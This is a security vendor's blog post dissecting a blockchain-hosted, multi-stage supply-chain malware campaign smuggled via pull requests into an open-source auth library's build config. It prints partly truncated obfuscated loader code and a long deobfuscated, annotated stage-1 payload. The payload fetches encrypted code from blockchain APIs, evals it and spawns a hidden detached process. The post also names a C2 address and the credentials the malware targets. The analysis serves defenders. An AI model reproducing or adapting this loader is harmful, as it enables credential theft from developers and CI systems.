---
schema_version: "1.0.0"
document_id: "04c17e1f7d18a7a51eac2dd06f5ab4c87621f91159e0453ec86953321b9d56c3"
company_key: "yc-casco"
company: "Casco"
source_id: "yc-casco-news-import-3e4503ef629e"
canonical_url: "https://casco.com/blog/the-blueprint-of-a-north-korean-attack-on-open-source"
published_at: "2026-03-31T02:57:38+00:00"
first_seen_at: "2026-07-21T12:40:29.812234+00:00"
fetched_at: "2026-07-28T21:56:50.434513+00:00"
content_hash: "sha256:dccb8427e770ce1f3bfb2bd3cee1223e73003a8ba61567e0733e449189b075b5"
---

# The Blueprint of a North Korean Attack on Open-Source

# The Blueprint of a North Korean Attack on Open-Source


Written by


[Rene Brandel](https://linkedin.com/in/renebrandel)


on


Fri Apr 03 2026


Just in the last 7 days, we've seen[LiteLLM](https://docs.litellm.ai/blog/security-update-march-2026) and[axios](https://x.com/karpathy/status/2038849654423798197) impacted by supply chain attacks. Recently, I was chatting with[Bereket Engida](https://www.linkedin.com/in/bekacru/) , the creator of the popular JS auth library:[Better-Auth](https://github.com/better-auth/better-auth) . He observed repeated attempts by a contributor to add malicious code directly via a pull request.


This malicious code downloads multi-stage payloads hosted on a blockchain and establishes a command and control server connection which ultimately compromises the machine. This is very similar to[DPRK's "EtherHiding"](https://cloud.google.com/blog/topics/threat-intelligence/dprk-adopts-etherhiding) .


These attacks were thankfully thwarted. However, this incident prompted me to write this technical deep dive as a warning for all developers.


Let's unpack what is going on in the attacker's mind and the anatomy of a supply chain attack in three parts:


- Part A: Attack initiation
- Part B: Attack breakdown
- Part C: Attack aftermath


## Part A: Attack initiation through a legitimate PR


The most dangerous aspect of this attack was the "wrapper." The attacker smuggled in malicious code via a PR from a compromised contributor's machine.


These PRs add legitimate, requested features. Looking at the history (specifically PRs[#6003](https://github.com/better-auth/better-auth/pull/6003/changes/acf0a7294366bf5b0d94d96e6a98e41e1c8f11aa) and[#5476](https://github.com/better-auth/better-auth/pull/5476/changes/9a230944f1abf951b1e05c44d3ba729b9f9d2df9) ), the pull requests had actual functional value but between all the changes, there was a standalone commit with the malicious code.


When doing a basic string match on the malicious code's signature string` lcdmccutnorbjrothxgunkyepaivtswrsozqf')` , we identified[30+ hits on GitHub](https://grep.app/search?q=lcdmccutnorbjrothxgunkyepaivtswrsozqf%27%29) . This is by no means exhaustive. I suspect there are hundreds, if not thousands of repos infected with[similar](https://www.reddit.com/r/github/comments/1m1z9g9/random_obfuscated_code_commit/?tl=de) patterns.


The real danger occurs once the code is merged because Github's default view provides no visual way to see the vulnerable code on their platform. **See what happens when you scroll to the right on this file.**[Try it yourself here.](https://github.com/herasoftlabs/ChainLab/blob/main/next.config.mjs)


This malicious code is inside the build configuration files, such as` next.config.mjs` or` vue.config.js` . This provides the attacker two benefits:


1. It's harder to spot for a human once it's merged because typically developers rarely change root-level build configurations.
2. If the externally-provided PR is ever permitted to run in CI/CD, the CI/CD environment becomes infected.


## Part B: Supply chain attack breakdown


Let's analyze what this weirdly obfuscated code does. To the untrained eye or a tired maintainer scrolling through 50 changed files, this might look like a random, minified build artifact. ( *I truncated the code to avoid accidental copy/pasting but you can find the full code in the linked PRs above.* ).


```text
global[  '_V'  ]  =  '8-1447'  ;global[  'r'  ]  =  require;  if  (  typeof   module  ===  'object'  )global[  'm'  ]  =  module  ;(  function  (){  var   VRG  =  ''  ,GhP  =  764  -  753  ;  function   MDy  (  f  ){  var   r  =  1111436  ;  var   w  =  f.  length  ;  var   h  =  [];  for  (  var   q  =  0  ;q  <  w;q  ++  ){h[q]  =  f.  charAt  (q)};  for  (  var   q  =  0  ;q  <  w;q  ++  ){  var   z  =  r  *  (q  +  119  )  +  (r  %  13553  );  var   i  =  r  *  (q  +  615  )  +  (r  %  37182  );  var   b  =  z  %  w;  var   c  =  i  %  w;  var   j  =  h[b];h[b]  =  h[c];h[c]  =  j;r  =  (z  +  i)  %  3896884  ;};  return   h.  join  (  ''  )};  var   tgr  =  MDy  (  'lcdmccutnorbjrothxgunkyepaivtswrsozqf'  ).  substr  (  0  ,GhP);  var   ruc  =  '.2h .0d6rr1r[,r=i=) r+)p.g12;;sfgm75(m.frg==za"qr }e.hvl[-]=c80]rag7c,eah7us;zht;rm0(;*i[4sre0v}[,)),8rr+rhr]]0,8(nao,1i(; <f tczfvf)ase]  +9(;9<ply0n t(;r)l+4rlt-ff!eujafopx;v{[;+s(or;1=tCqa;;=61uf)rovty1nt[gooa"e(uv]r;u( n;thc2+o)tvp]o+oa8qr f{talw=>{8-lo4vusSfxt{!cv)nf(.p]uSek;on8ha(0aye-m;=a9<v.rnlo;l0ag7(in.2q-=otwp[n=1yo;7hg;=uzib 7sr.r(..vnA]a) d7h7ilt)e r(u;g ;6)=+m;choh.C)xvtlrsh(tA;(f)0=,r+m7+"0=h8uvi;oivh9"1auCm9(c[+r.tue+nr,ap65=[qa7no(o9ue)r;(;()x.=ns{k,f,se,l[naw,aet+vcha1ev;ho=6coitav,5scar7lhpt govo,q-ka ov,C[wsi}"d]0e)]ti=0.rkif=<=cn(l,2ee[laA+otn=2" )r.h,{.h;uhtp*wfeeft)r1s>.([o.}.)+u=2" (Cpl;r.a.;j;)+o;rri)h( ,))e[u"aAdohdbgt(v)gr2w)hwdy8f1.rop=.w,iy=] r;b=p=ls=,tb}lh.3,i;i+1lne=wf;=ar. =s4"sl;63n,rrh u(s+]=+}acnp;(q71;rr=fcC6l8g,f9d;C(a=lvlnvj;;"(aonz.itlb;; a(taesi6h, ru+(fdf;evr ake}=+5)rizf<-enj=in)=)o(ngi,A+mib(;,ode)(){]))urvv6sn+d6=ad+to=at;=C,j)1=+iz='  ;  var   oWZ  =  MDy[tgr];  var   kcL  =  ''  ;  var   AoT  =  oWZ;  var   yus  =  oWZ  (kcL,  MDy  (ruc));  var   quw  =  yus  (  MDy  (  '
```


This malicious snippet siphons out your environment variables and establishes a connection to a "command and control server", which allows the attacker to send arbitrary commands to execute locally.


This malicious snippet runs the moment somebody starts their CI process (` npm run build` ) or their dev server (` npm run dev` ). Then, it proceeds to download a 2nd stage payload, which is another set of malicious code.


This 2nd stage malicious code is executed in a zombie process. This zombie process then downloads a 3rd stage payload, which includes a 91KB javascript code snippet


that spins up the command and control server connection which ultimately compromises the machine.


### Stage 1: Step-by-step explainer of what the malicious code actually does


Let's first prettify the code and then analyze it section by section.


vuln.js


1


global\['_V'\] = '8-1447';


2


global\['r'\] = require;


3


if (typeof module === 'object') global\['m'\] = module;


4


5


(function () {


6


var VRG = '';


7


var GhP = 764 - 753;


8


9


function MDy(f) {


10


var r = 1111436;


11


var w = f.length;


12


var h = \[\];


13


for (var q = 0; q < w; q++) {


14


h\[q\] = f.charAt(q)


15


};


16


for (var q = 0; q < w; q++) {


17


var z = r * (q + 119) + (r % 13553);


18


var i = r * (q + 615) + (r % 37182);


19


var b = z % w;


20


var c = i % w;


21


var j = h\[b\]; h\[b\] = h\[c\]; h\[c\] = j;


22


r = (z + i) % 3896884;


23


};


24


return h.join('');


25


}


26


27


var tgr = MDy('lcdmccutnorbjrothxgunkyepaivtswrsozqf').substr(0, GhP);


28


var ruc = '.2h .0d6rr1r\[,r=i=) r+)p.g12;;...'; // 890 chars


29


30


var oWZ = MDy\[tgr\];


31


var kcL = '';


32


var AoT = oWZ;


33


var yus = oWZ(kcL, MDy(ruc));


34


35


var quw = yus(MDy('i+\]Pet)=( en\]E_4\]9r2%PT;...')); // 2,634 chars


36


37


var tzo = AoT(VRG, quw);


38


tzo(5471);


39


return 3456;


40


})();


Step 1 — Global hooks


### Planting flags before anything else runs


The first three lines execute before the main IIFE. They stamp a version marker onto the global object (_V = '8-1447', a campaign ID the C2 server uses to track which payload version infected each machine), then capture require and module into globals so they stay accessible inside the sandboxed function scope that follows. GhP = 764 - 753 is a simple trick: compute 11 at runtime rather than writing the literal, so grep for '11' finds nothing.


Lines 1–7


Step 2 — The shuffler


### MDy: a deterministic character scrambler


MDy is the obfuscation engine. Given any string, it performs a deterministic swap sequence across all character positions driven by the hardcoded seed 1111436. The same seed always produces the same permutation, so it is fully reversible at runtime. To a code reviewer it looks like meaningless arithmetic on a character array. Every sensitive string in this file passes through MDy before it is used.


Lines 9–25


Step 3 — The signature string


### lcdmccutnorbjrothxgunkyepaivtswrsozqf decrypts to 'constructor'


tgr is the 37-character string that has become this malware family's fingerprint across 30+ infected repositories. When passed through MDy and trimmed to GhP characters (which equals 11 at runtime), it produces the string 'constructor'. That word is how the attacker reaches into the JavaScript engine itself without ever writing it in plain text.


Lines 27–28


Step 4 — Function constructor chain


### Building executable code without writing eval or Function


MDy\[tgr\] resolves to MDy\['constructor'\], which is JavaScript's built-in Function constructor. Identical to writing Function() directly, but invisible to any static scanner searching for that keyword. oWZ(kcL, MDy(ruc)) decodes the 890-character ruc blob and passes it as the body of a brand-new function, yus. yus is the custom decoder that only exists in memory at runtime and leaves no trace on disk.


Lines 30–33


Step 5 — Execution


### tzo(5471) fires and the machine is compromised


yus decodes the 2,634-character quw blob into valid JavaScript. AoT (an alias for the Function constructor established on line 32) wraps it into a callable named tzo. tzo(5471) runs it. From this point the machine is compromised: the payload queries a blockchain dead drop for an encrypted Stage 2 loader, spawns a detached child process that survives after the build exits, and the infection continues silently.


Lines 35–40


The` tzo(5471)` call fires a decoded function body that only existed in memory. Here is that logic, annotated.


vuln.js


1


function tzo(...) { // deobfuscated internals


2


var _$_4eb3 = _$af402005("t%b3c7dr...07ec", 1111436);


3


function _$af402005(b, h) {


4


var o = b.length;


5


var s = \[\];


6


for (var k = 0; k < o; k++) {


7


s\[k\] = b.charAt(k);


8


}


9


;


10


for (var k = 0; k < o; k++) {


11


var n = h * (k + 119) + h % 13553;


12


var y = h * (k + 615) + h % 37182;


13


var w = n % o;


14


var c = y % o;


15


var l = s\[w\];


16


s\[w\] = s\[c\];


17


s\[c\] = l;


18


h = (n + y) % 3896884;


19


}


20


;


21


var v = " ";


22


var p = "";


23


var d = "%";


24


var m = "#1";


25


var u = "%";


26


var j = "#0";


27


var i = "#";


28


return s.join(p).split(d).join(v).split(m).join(u).split(j).join(i).split(v);


29


}


30


(async () => {


31


const i = global;


32


const d = i\[_$_4eb3\[0\]\];


33


async function o(t) {


34


return new i\[_$_4eb3\[10\]\]((r, n) => {


35


if (!_$_4eb3) {


36


_$af402005 = 1;


37


}


38


;


39


d(_$_4eb3\[9\])\[_$_4eb3\[8\]\](t, t => {


40


let e = _$_4eb3\[4\];


41


t\[_$_4eb3\[3\]\](_$_4eb3\[5\], t => {


42


if (!_$_4eb3) {


43


_$af402005(false, true, _$_4eb3\[31\]);


44


_$af402005 = _$_4eb3\[9\];


45


return;


46


}


47


;


48


e += t;


49


});


50


t\[_$_4eb3\[3\]\](_$_4eb3\[1\], () => {


51


if (_$af402005 == 1) {


52


_$af402005();


53


_$af402005 = null;


54


}


55


;


56


try {


57


r(i\[_$_4eb3\[7\]\]\[_$_4eb3\[6\]\](e));


58


} catch (t) {


59


n(t);


60


}


61


});


62


})\[_$_4eb3\[3\]\](_$_4eb3\[2\], t => {


63


n(t);


64


})\[_$_4eb3\[1\]\]();


65


});


66


}


67


if (!_$af402005) {


68


return;


69


}


70


;


71


async function c(a, c = \[\], s) {


72


return new i\[_$_4eb3\[10\]\]((r, n) => {


73


const t = JSON\[_$_4eb3\[12\]\]({jsonrpc: _$_4eb3\[11\], method: a, params: c, id: 1});


74


const e = {hostname: s, method: _$_4eb3\[13\]};


75


const o = d(_$_4eb3\[9\])\[_$_4eb3\[14\]\](e, t => {


76


let e = _$_4eb3\[4\];


77


t\[_$_4eb3\[3\]\](_$_4eb3\[5\], t => {


78


e += t;


79


});


80


t\[_$_4eb3\[3\]\](_$_4eb3\[1\], () => {


81


try {


82


r(i\[_$_4eb3\[7\]\]\[_$_4eb3\[6\]\](e));


83


} catch (t) {


84


n(t);


85


}


86


});


87


})\[_$_4eb3\[3\]\](_$_4eb3\[2\], t => {


88


n(t);


89


});


90


if (_$af402005 == null) {


91


return;


92


}


93


;


94


o\[_$_4eb3\[15\]\](t);


95


o\[_$_4eb3\[1\]\]();


96


});


97


}


98


async function t(a, t, e) {


99


let r;


100


try {


101


r = i\[_$_4eb3\[25\]\]\[_$_4eb3\[24\]\]((await o(


102


"https://api.trongrid.io/v1/accounts/" + t + _$_4eb3\[22\]


103


))\[_$_4eb3\[5\]\]\[0\]\[_$_4eb3\[21\]\]\[_$_4eb3\[5\]\], _$_4eb3\[23\])


104


\[_$_4eb3\[20\]\](_$_4eb3\[19\])\[_$_4eb3\[18\]\](_$_4eb3\[4\])


105


\[_$_4eb3\[17\]\]()\[_$_4eb3\[16\]\](_$_4eb3\[4\]);


106


if (!r) {


107


throw new Error;


108


}


109


} catch (t) {


110


r = (await o(


111


"https://fullnode.mainnet.aptoslabs.com/v1/accounts/" + e + _$_4eb3\[28\]


112


))\[0\]\[_$_4eb3\[27\]\]\[_$_4eb3\[26\]\]\[0\];


113


}


114


;


115


let n;


116


try {


117


n = i\[_$_4eb3\[25\]\]\[_$_4eb3\[24\]\](


118


(await c(_$_4eb3\[33\], \[r\], _$_4eb3\[34\]))


119


\[_$_4eb3\[32\]\]\[_$_4eb3\[31\]\]\[_$_4eb3\[30\]\](2), _$_4eb3\[23\])


120


\[_$_4eb3\[20\]\](_$_4eb3\[19\])\[_$_4eb3\[18\]\](_$_4eb3\[29\])\[1\];


121


if (!_$_4eb3) {


122


_$af402005 = false;


123


return;


124


} else {


125


if (!n) {


126


throw new Error;


127


}


128


}


129


} catch (t) {


130


n = i\[_$_4eb3\[25\]\]\[_$_4eb3\[24\]\](


131


(await c(_$_4eb3\[33\], \[r\], _$_4eb3\[35\]))


132


\[_$_4eb3\[32\]\]\[_$_4eb3\[31\]\]\[_$_4eb3\[30\]\](2), _$_4eb3\[23\])


133


\[_$_4eb3\[20\]\](_$_4eb3\[19\])\[_$_4eb3\[18\]\](_$_4eb3\[29\])\[1\];


134


}


135


;


136


if (!_$af402005) {


137


_$af402005();


138


}


139


;


140


return (e => {


141


const r = a\[_$_4eb3\[36\]\];


142


let n = _$_4eb3\[4\];


143


for (let t = 0; t < e\[_$_4eb3\[36\]\]; t++) {


144


const o = a\[_$_4eb3\[37\]\](t % r);


145


n += i\[_$_4eb3\[39\]\]\[_$_4eb3\[38\]\](e\[_$_4eb3\[37\]\](t) ^ o);


146


}


147


;


148


return n;


149


})(n);


150


}


151


try {


152


const e = await t(_$_4eb3\[40\], _$_4eb3\[41\], _$_4eb3\[42\]);


153


eval(e);


154


} catch (t) {}


155


;


156


try {


157


const e = await t(_$_4eb3\[43\], _$_4eb3\[44\], _$_4eb3\[45\]);


158


if (!_$af402005) {


159


return;


160


} else {


161


d(_$_4eb3\[52\])\[_$_4eb3\[51\]\](_$_4eb3\[46\],


162


\[_$_4eb3\[47\], "global\['_V'\]='" + (i\[_$_4eb3\[48\]\] || 0) + _$_4eb3\[49\] + e + _$_4eb3\[4\]\],


163


{detached: true, stdio: _$_4eb3\[50\], windowsHide: true}


164


)\[_$_4eb3\[3\]\](_$_4eb3\[2\], t => {


165


eval(e);


166


});


167


}


168


} catch (t) {}


169


})();


170


}


Step 1 — String array bootstrap


### Every API name is hidden behind an index


_$af402005 is the same character-shuffle algorithm from Stage 1, seeded with 1111436. It is called immediately with a 890-char encoded string and returns _$_4eb3: an array of ~55 decoded strings holding every API name, method, and constant used in this function. Writing _$_4eb3\[0\] instead of a literal string means every grep for API names returns nothing. The entire call surface is invisible to static analysis.


Lines 2–29


Step 2 — HTTPS fetcher


### HTTP client used to reach the blockchain dead drops


Function o is a Promise wrapper around Node's https module, accessed as d(_$_4eb3\[9\]) where the string 'https' is decoded at runtime. It makes a GET request, accumulates the response body, and returns parsed JSON. This is the function that reaches api.trongrid.io and fullnode.mainnet.aptoslabs.com. Both are legitimate, publicly trusted blockchain APIs, which means the outbound request looks completely normal to any network monitor.


Lines 39–49


Step 3 — JSON-RPC caller


### JSON-RPC POST client with hostname encoded at runtime


Function c makes JSON-RPC POST requests to a blockchain node. The method name is _$_4eb3\[33\] and the target hostnames are _$_4eb3\[34\] and _$_4eb3\[35\], all decoded at runtime from the string array. Neither the method nor the endpoints are readable without decoding first. This function is called after the TronGrid or Aptos lookup has returned a transaction reference, using that reference to retrieve the encrypted payload from the node.


Lines 71–97


Step 4 — Blockchain dead drop


### trongrid.io primary, aptoslabs.com fallback, then XOR decrypt


Function t is the payload retrieval engine. The primary path queries api.trongrid.io with the address in argument t. If that throws, the fallback queries fullnode.mainnet.aptoslabs.com with address e. The result from either path is used as input to function c, a JSON-RPC call to an encoded blockchain node hostname. The raw bytes returned are then XOR-decrypted using key a, character by character, producing live executable JavaScript in memory.


Lines 99–114


Step 5 — Zombie spawn


### Spawning a zombie process that survives after the build exits


d(_$_4eb3\[52\])\[_$_4eb3\[51\]\]() resolves to require('child_process').spawn(). Three flags make the child a zombie: detached: true promotes it to its own process group so it survives when the parent exits; _$_4eb3\[50\] decodes to 'ignore', severing all stdio pipes so the parent does not wait; windowsHide: true suppresses any console window on Windows. The build exits with code 0. The developer sees success. The spawned node process runs the Stage 2 payload independently and silently.


Lines 161–166


Finally` tzo(5471)` spawns a zombie process that lives on even after the main process (e.g.` npm run build` /` npm run dev` ) from stage 1 exits.


Running a` ps aux | grep "node -e.*global\\\['_V'\\\]"` will show you the zombie process. ( *Again, I truncated the code for safety but you can find the full code in the linked PRs above.* ).


```text
node   -e   global['_V']='8-1447'  ;if(  'function'   ===typeof   require  )global[  'r'   ]=require;if(  typeof   module===   'object'   )global[  'm'  ]=module;  var   a0n,a0b,_global,a0a  ;(  function  (){  var   rms='',IaL=200-189  ;  function   gOe  (  z  ){  var   y=  3547675  ;  var   w=z.length  ;  var   m=[]  ;  for  (  var   x=  0  ;  x  <w;  x++  ){m[x]  =  z.charAt  (  x  )};  for  (  var   x=  0  ;  x  <w;  x++  ){  var   f=y  *  (  x+360  )  +  (  y%32226  );  var   i=y  *  (  x+326  )  +  (  y%51262  );  var   a=f%w  ;  var   j=i%w  ;  var   g=m[a]  ;m[a]  =  m[j  ];m[j]  =  g  ;y  =  (  f+i  )%3722251;};  return   m.join  (  ''  )  }  ;  var   naW=gOe  (  'wodstriuznuobanchgfcttycmroqrvelspkxj'  )  .substr  (  0,IaL  );  var   Mcf='".) 1bl6uep(,b(r.72v.ir +"y1[dh.[h0j+lhio(9+qe"9i;h]h;vara+;1no,(y6p0,o9f7a,k2 7t,(5g8{ +v  cnvud6=rnav87,asf]A8};+=v,l4<,lgj "=ra(f u=) v(rij)kta0in".rgf)vg nl{[.]a=Ca1=(;(g;= =;mt=[7l}+=o!(4*0=9hfor;rr upe((pthe[8)i+"e;l.C;  s]+aa.;frj)iscc=mg)+sep;sn]li2(u6))xr)rfv0ginjgvlfgl;u.axt>dnit]]a{a+pt)ft,h)sv2r((v;{g-;Ce} =a,rr=;o[rrhv0lvjfcxoborvnht87va)(,;(o])(
```


### Stage 2: Loading the command and control payload


Stage 2's code is almost **logically identical** to Stage 1's code. The primary difference is that Stage 2's code is obfuscated with a different seed and loads the 3rd stage payload from a different blockchain address.


Stage 1 (outer wrapper) ← same algorithm → Stage 2 (zombie wrapper)


Shuffler function name


Seed constant


Size obfuscation (both = 11)


Modulus constants


Signature string


Constructor accessor


Encoded payload blob


− Stage 1 (outer wrapper)


+ Stage 2 (zombie wrapper)


1


global\['_V'\] = '8-1447';


-


2


global\['r'\] = require;


+


2


if ('function' === typeof require) global\['r'\] = require;


3


if (typeof module === 'object') global\['m'\] = module;


+


4


var a0n, a0b, _global, a0a;


4


(function() {


-


5


var VRG = '',


+


6


var rms = '',


-


6


GhP =


764 - 753 ;


+


7


IaL =


200 - 189 ;


-


7


function


MDy (f) {


+


8


function


gOe (z) {


-


8


var r =


1111436 ;


+


9


var y =


3547675 ;


-


9


var w = f.length;


+


10


var w = z.length;


-


10


var h = \[\];


+


11


var m = \[\];


-


11


for (var q = 0; q < w; q++) {


+


12


for (var x = 0; x < w; x++) {


This 3rd payload is significantly larger at 91 KB and houses the command and control logic. This payload is fetched from Binance Smart Chain (BSC).


```text
POST   https://bsc-dataseed.binance.org/
Content-Type  :   application/json


{
"jsonrpc"  :   "2.0"  ,
"method"  :   "eth_getTransactionByHash"  ,
"params"  : [  "..................................."  ],
"id"  :   1
}
```


### Stage 3: The command and control payload


Stage 3 is 91 KB of RC4-encrypted JavaScript, packed with 1,467 encrypted strings and a flattened state machine. Once unpacked, it does three things in sequence:


**System fingerprinting.** Before contacting the attacker, it takes a snapshot of the compromised machine: OS type and version, CPU count, total RAM, hostname, username, home directory, and all environment variables visible to the Node process. This snapshot is used to uniquely identify each victim.


**Establishing a connection to the command and control server` 198.105.127.210/socket.io/` .** The malware contacts a command and control server via Socket.IO's HTTP long-polling transport. It sends an identification beacon (the system fingerprint) and enters a polling loop, waiting for instructions. The use of Socket.IO over port 80 makes this traffic indistinguishable from normal web application traffic.


**Executing arbitrary commands.** The C2 server can now issue four classes of commands to any connected victim: run shell commands (` exec` ), evaluate arbitrary JavaScript in-process (` eval` ), download and execute additional payloads (` download` ), and install persistence mechanisms (` persist` ). From this point, the attacker has full interactive access to anything the Node process can reach.


The immediate targets are environment variables:` AWS_ACCESS_KEY_ID` ,` DATABASE_URL` ,` STRIPE_SECRET_KEY` ,` OPENAI_API_KEY` ,` GITHUB_TOKEN` , and anything else present in` .env` files at build time. SSH keys, browser credential stores, and shell history are secondary targets, accessible on command.


Machine compromised.


## Part C: Attack aftermath


Once the malicious payload executes and compromises a machine, the true danger of a supply chain attacks are second-order effects.


In a CI/CD environment, the blast radius is even larger. Many pipelines run with elevated IAM roles that have broad access to cloud infrastructure. A single infected build step (even in a dev environment) in a pipeline can expose database credentials, artifact signing keys, AWS roles with` AdministratorAccess` , and internal service tokens.


Another risk of lateral movement is the spread to other packages that depend on a compromised package. A historical example: In 2018, the popular npm package` event-stream` (which had over 1.5 million weekly downloads at the time) was compromised. The original author, lacking the time to maintain it,[handed ownership over](https://github.com/dominictarr/event-stream/issues/116#issuecomment-440927400) to a seemingly helpful contributor named "right9ctrl".


The attacker added a new dependency called` flatmap-stream` , which they also controlled. Then, they pushed an update to` flatmap-stream` containing a highly targeted payload designed to steal cryptocurrency from the bitpay-dash app.


Because` event-stream` was a foundational dependency used by thousands of other packages (like Vue CLI), millions of developers downloaded the compromised code. The attack went undetected for nearly two and a half months.


*In an effort to illustrate the impact of a supply chain attack, I created the following impact calculator using Gemini Deep Research.*


Interactive Tool


## Supply Chain Impact Calculator


Adjust the parameters to model a real attack scenario. Heuristics provided by Gemini Deep Research.


impact-calculator.js


Variables


Weekly npm Downloads ($D$)


(vanity metric)


2.0M


Days Malware Was Live ($T$)


4d


Spans a Weekend ($W$)


−40% weekend traffic → ×0.80


Calculation Breakdown


Active Downloads


(2.0M/7) × 4d × 0.8


914.3K


Unique Envs


914.3K × 1.0%


9.1K


Lockfile Bypass


9.1K × 10.0%


914


▸ PRIMARY


914 × 70.0%


640


Pipelines Hit


640 × 5.0%


32


▸ SECONDARY


32 × 1,000


32.0K


Origin


Primary — 640 machines


Secondary — 32.0K victims


Primary Machines Compromised


640


Developer machines & CI runners with malicious code executed


Second-Order Victims


32,000


End-user systems reached via 32 poisoned publishing pipelines


### Blockchains as a permanent, public hosting infrastructure for malicious code


Traditional malware relies on infrastructure that can be dismantled. Security teams and law enforcement can identify a malicious C2 server, file an abuse report, and have it taken offline within hours. Domain registrars can revoke DNS. ISPs can null-route IP addresses. Cloud providers can suspend accounts. This response chain, while imperfect, has historically been an effective backstop against persistent malware campaigns.


Blockchain breaks this model entirely.


When a malware author stores an encrypted payload inside a blockchain transaction, that data becomes permanent and globally replicated. A blockchain network runs across thousands of independent nodes worldwide. No single authority (not any exchange, not law enforcement, not any government) can alter or remove a confirmed transaction. The data is as permanent as the blockchain itself, which is designed specifically to be immutable.


In contrast, the` axios` attack from a few days ago could be taken down because the 2nd stage payload was hosted on a GitHub repository. This wouldn't be possible with the attempted attack on` better-auth` .


### About Casco


Casco performs always-on autonomous security testing on your applications, APIs, infrastructure, and AI systems. Talk to us if you want to get hacked before bad actors hack you.[Book a demo](https://casco.com/book) .


## A few words of appreciations


This blog post wouldn't be possible without the help of


- [Bereket Engida](https://www.linkedin.com/in/bekacru/) and the[Better-Auth](https://github.com/better-auth/better-auth) team
- [Blaxel](https://blaxel.ai/) for providing a secure sandbox for us to analyze the malicious code
- [Noah Lebovic](https://www.linkedin.com/in/lebovic/) for providing valuable feedback on the blog post
